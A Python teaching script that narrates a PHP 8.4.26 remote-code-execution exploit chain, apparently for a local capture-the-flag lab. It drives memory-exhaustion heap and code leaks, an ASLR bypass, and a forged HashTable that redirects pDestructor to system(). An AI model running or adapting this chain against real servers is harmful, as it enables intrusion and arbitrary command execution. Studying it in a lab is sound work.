#!/usr/bin/env python3
"""Narrated walkthrough of the Steal My Bitcoin PoC, for learning.

This does NOT change the original exploit logic. It imports the real
functions from stealmybitcoin_poc.py (same multipart shapes, same byte
offsets, same math) and just prints out what is happening at every step:
what gets sent, what comes back, and how each returned value is turned
into the next step's input.

Only talks to loopback targets - this is a teaching wrapper around a
local lab, not a tool for hitting arbitrary hosts.

Usage:
    python3 -I walkthrough.py --url http://127.0.0.1:18166/php-version.php
"""

from __future__ import annotations

import argparse
import os
import secrets
import struct
import sys
from pathlib import Path

# Defaults to a sibling checkout (clone KillaBoi/StealMyBitcoin-PoC next to
# this file - see README). Override with --poc-dir or $STEALMYBITCOIN_POC_DIR
# if you put it somewhere else.
DEFAULT_POC_DIR = Path(__file__).resolve().parent / "StealMyBitcoin-PoC"


def banner(title: str) -> None:
    print()
    print("=" * 78)
    print(title)
    print("=" * 78)


def hexdump(data: bytes, width: int = 16) -> None:
    for offset in range(0, len(data), width):
        chunk = data[offset:offset + width]
        hexpart = " ".join(f"{b:02x}" for b in chunk)
        asciipart = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {offset:04x}  {hexpart:<{width * 3}} {asciipart}")


def explain_producer(stage_name: str, shape: poc.ProducerShape, body: bytes) -> None:
    banner(f"STAGE INPUT: {stage_name} producer (the memory-exhaustion request)")
    print(f"Wire size of this POST body: {len(body):,} bytes")
    print(f"It contains {shape.count} deeply nested form-field names, each")
    print(f"{shape.depth} levels deep (like f[3][x][x][x]...[x]).")
    print("PHP has to allocate a nested array structure for every one of")
    print("those names while it parses the upload, so a ~250 KB request on")
    print("the wire turns into far more than 250 KB of allocations inside")
    print("the PHP process - enough to hit the 128 MiB memory_limit.")
    print("When PHP dies mid-parse like this, whatever it had already built")
    print("for this connection's session state is left dangling in that")
    print("worker process's memory instead of being cleaned up.")


def explain_consumers(stage_name: str, count: int) -> None:
    banner(f"STAGE INPUT: {stage_name} consumers ({count} follow-up requests)")
    print("These are sent on the same TCP connection, pipelined (all written")
    print("before any response is read back), right after the producer.")
    print("The goal: get PHP to route one of these to the *same worker*")
    print("process that just crashed, before that worker's memory is reset.")
    print("If that happens, this request's own session-cookie handling ends")
    print("up reading and returning bytes that are still sitting in memory")
    print("from the crashed request - not data this request put there.")
    print("That's the leak: PHP hands back someone else's leftover memory")
    print("inside something that looks like an ordinary session cookie.")


def run_narrated_leak_stage(target: poc.Target, stage: poc.LeakStage):
    producer = poc.leak_producer(stage.producer)
    explain_producer(stage.name, stage.producer, producer)

    consumer = stage.build_consumer()
    explain_consumers(stage.name, poc.CONSUMERS)

    request = poc.http_frame(target, producer, poc.COOKIE_BOUNDARY,
                              cookie_pairs=poc.COOKIE_PAIRS, close=False)
    request += b"".join(
        poc.http_frame(target, consumer, poc.COOKIE_BOUNDARY,
                        close=index == poc.CONSUMERS - 1)
        for index in range(poc.CONSUMERS))

    print(f"\nTotal bytes being written to the socket in one go: {len(request):,}")
    print("(1 producer + 8 consumers, pipelined on one connection)")

    banner(f"SENDING: {stage.name} batch")
    responses = []
    candidates = set()
    with target.connect() as connection:
        stream = connection.makefile("rb")
        reader = poc.RecordingReader(stream)
        connection.sendall(request)
        shared = poc.SharedSocket(reader)
        for i in range(poc.CONSUMERS + 1):
            record, cookie, _body = poc.receive(shared)
            responses.append(record)
            role = "producer" if i == 0 else f"consumer #{i}"
            print(f"  [{role:>13}] HTTP {record['status']}  "
                  f"cookie_bytes={record['cookie_bytes']:>4}  "
                  f"OOM_fatal={record['oom']}")
            if i > 0 and record["cookie_bytes"] not in (poc.ORDINARY_COOKIE_BYTES,
                                                         stage.leak_cookie_bytes):
                print(f"      -> unexpected cookie size, something is off")
            value = stage.read_candidate(cookie)
            if value is not None:
                candidates.add(value)
                print(f"      -> this cookie decodes to a candidate address: {value:#x}")
        stream.close()

    banner(f"RESULT: {stage.name} leak")
    producer_record = responses[0]
    if not (producer_record["status"] == 200
            and producer_record["powered_by"] == poc.PHP_VERSION
            and producer_record["oom"] is True):
        raise RuntimeError(f"{stage.name}: producer did not OOM as expected")
    if len(candidates) != 1:
        raise RuntimeError(
            f"{stage.name}: expected exactly one leaked address, got {len(candidates)}")
    base = candidates.pop()
    print(f"Agreed-upon leaked value: {base:#x}  ({stage.describes})")
    return base


def explain_heap_math(heap_base: int) -> int:
    banner("WHY THE HEAP LEAK MATTERS")
    print(f"zend_heap_base      = {heap_base:#x}")
    print(f"HEAP_CARRIER_DELTA   = {poc.HEAP_CARRIER_DELTA:#x}  (measured offline, this build)")
    print(f"HEAP_CARRIER_OFFSET  = {poc.HEAP_CARRIER_OFFSET:#x}  (measured offline, this build)")
    target = heap_base - poc.HEAP_CARRIER_DELTA + poc.HEAP_CARRIER_OFFSET
    print(f"target = heap_base - DELTA + OFFSET = {target:#x}")
    print("This 'target' address is where, in the final request, PHP will")
    print("already have a pointer sitting in memory that we fully control.")
    print("We're going to place our own forged data at this exact address")
    print("and later trick PHP into treating it as a real internal struct.")
    return target


def explain_code_math(dtor_addr: int) -> int:
    banner("WHY THE CODE LEAK MATTERS")
    print(f"zval_ptr_dtor address = {dtor_addr:#x}")
    print(f"low 21 bits           = {dtor_addr & poc.CHUNK_MASK:#x}  "
          f"(must equal {poc.DTOR_LOW21:#x} - confirms this PHP build)")
    print(f"ZIF_SYSTEM_FROM_DTOR  = {poc.ZIF_SYSTEM_FROM_DTOR:#x}  "
          "(fixed byte distance in this PHP binary's layout)")
    zif_system = dtor_addr + poc.ZIF_SYSTEM_FROM_DTOR
    print(f"zif_system = zval_ptr_dtor + ({poc.ZIF_SYSTEM_FROM_DTOR:#x}) = {zif_system:#x}")
    print("zif_system is PHP's C function that implements the system()")
    print("call. We now know exactly where it lives in this process's")
    print("memory, even though ASLR randomizes that location every time")
    print("the process starts - because we just leaked it from THIS run.")
    return zif_system


def explain_forged_structure(target_addr: int, zif_system: int, command: bytes) -> bytes:
    banner("BUILDING THE FORGED STRUCTURE")
    print("PHP represents arrays internally as a struct called a HashTable.")
    print("One of its fields, pDestructor, is a function pointer PHP calls")
    print("when it needs to clean up / destroy a value. We're going to lay")
    print("out 384 raw bytes that LOOK like a legitimate HashTable + call")
    print("frame + string, but with pDestructor overwritten to point at")
    print(f"zif_system ({zif_system:#x}), and a string argument containing")
    print("our own shell command instead of whatever PHP expected there.")
    print(f"\nThis structure will be placed at address {target_addr:#x},")
    print("which is the exact address we calculated from the heap leak.")
    print(f"\nShell command we're smuggling in ({len(command)} bytes):")
    print(f"  {command.decode()}")

    forged = poc.fake_hashtable(target_addr, zif_system, command)
    print(f"\nHex dump of the 384-byte forged structure:")
    hexdump(forged[:0x98])
    print("  (bytes 0x00-0x1F : fake zend_array/HashTable header,")
    print("   with pDestructor at offset 0x30 pointing at zif_system)")
    print("  (bytes 0x20-0x97 : fake call-frame fields PHP reads during")
    print("   cleanup, including arg1 pointing at the string below)")
    print("  (bytes 0x80-0x97 : fake zend_string header just before the")
    print("   command text that starts at offset 0x98)")
    print(f"\nCommand text region (offset {poc.COMMAND_OFFSET:#x} onward):")
    print(f"  {forged[poc.COMMAND_OFFSET:poc.COMMAND_OFFSET + len(command) + 1]!r}")
    return forged


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True,
                         help="Loopback lab version endpoint, e.g. "
                              "http://127.0.0.1:18166/php-version.php")
    parser.add_argument("--output-dir", type=Path, default=None)
    parser.add_argument("--poc-dir", type=Path,
                         default=Path(os.environ.get("STEALMYBITCOIN_POC_DIR",
                                                       str(DEFAULT_POC_DIR))),
                         help="Path to a KillaBoi/StealMyBitcoin-PoC checkout "
                              f"(default: {DEFAULT_POC_DIR})")
    args = parser.parse_args()

    if not (args.poc_dir / "stealmybitcoin_poc.py").is_file():
        print(f"[abort] {args.poc_dir} has no stealmybitcoin_poc.py - clone "
              "https://github.com/KillaBoi/StealMyBitcoin-PoC there, or pass "
              "--poc-dir / set $STEALMYBITCOIN_POC_DIR.", file=sys.stderr)
        return 1
    sys.path.insert(0, str(args.poc_dir))
    global poc
    import stealmybitcoin_poc as poc

    target = poc.parse_target(args.url)
    if target.host not in ("127.0.0.1", "localhost"):
        print("[abort] This walkthrough only runs against your local lab "
              "(127.0.0.1/localhost). Use stealmybitcoin_poc.py directly "
              "for the real challenge.", file=sys.stderr)
        return 1

    banner("STEP 0: health check")
    print(f"Target: {args.url}")
    poc.preflight(target)
    print("Confirmed: target answers as PHP 8.4.26, the exact build this")
    print("exploit's offsets were measured against. Nothing else proceeds")
    print("without this check passing.")

    heap_base = run_narrated_leak_stage(target, poc.STAGES["heap"])
    target_addr = explain_heap_math(heap_base)

    dtor_addr = run_narrated_leak_stage(target, poc.STAGES["code"])
    zif_system = explain_code_math(dtor_addr)

    nonce = secrets.token_hex(8)
    command = poc.proof_command(nonce)
    forged = explain_forged_structure(target_addr, zif_system, command)

    banner("STEP 4: sending the final, forged request")
    body = poc.final_multipart(heap_base, dtor_addr, command)
    assert poc.fake_hashtable(target_addr, zif_system, command) == forged
    request = poc.final_http_frame(target, body)
    print(f"Final POST body size: {len(body):,} bytes")
    print("This request's last field name is deliberately enormous, which")
    print("triggers another memory-limit fatal. This time, when PHP tears")
    print("down the half-built session state during cleanup, it walks into")
    print("our forged structure at the address we pre-computed, reads our")
    print("fake pDestructor pointer, and calls it - running zif_system with")
    print("our command string as its argument.")

    with target.connect() as connection:
        stream = connection.makefile("rb")
        reader = poc.RecordingReader(stream)
        connection.sendall(request)
        response = poc.http.client.HTTPResponse(poc.SharedSocket(reader))
        response.begin()
        status = response.status
        body_out = response.read(poc.MAX_RESPONSE_BYTES)
        stream.close()

    banner("RESPONSE")
    print(f"HTTP status: {status}")
    print(body_out.decode(errors="replace"))

    nonce_seen = nonce.encode() in body_out
    id_seen = poc.re.search(rb"\buid=\d+", body_out) is not None
    hash_seen = poc.re.search(rb"\b[0-9a-f]{64}\s+\S*print-flag\b", body_out) is not None
    verified = status == 200 and nonce_seen and id_seen and hash_seen

    banner("VERDICT")
    print(f"nonce (proves this exact run, not a replay) seen: {nonce_seen}")
    print(f"id output (proves a real shell ran)           seen: {id_seen}")
    print(f"print-flag binary hash                         seen: {hash_seen}")
    print(f"\nexecution_proof_verified = {verified}")

    if args.output_dir:
        args.output_dir.mkdir(parents=True, exist_ok=True)
        (args.output_dir / "final.response.body").write_bytes(body_out)
        print(f"\nSaved raw response body to {args.output_dir / 'final.response.body'}")

    return 0 if verified else 1


if __name__ == "__main__":
    raise SystemExit(main())
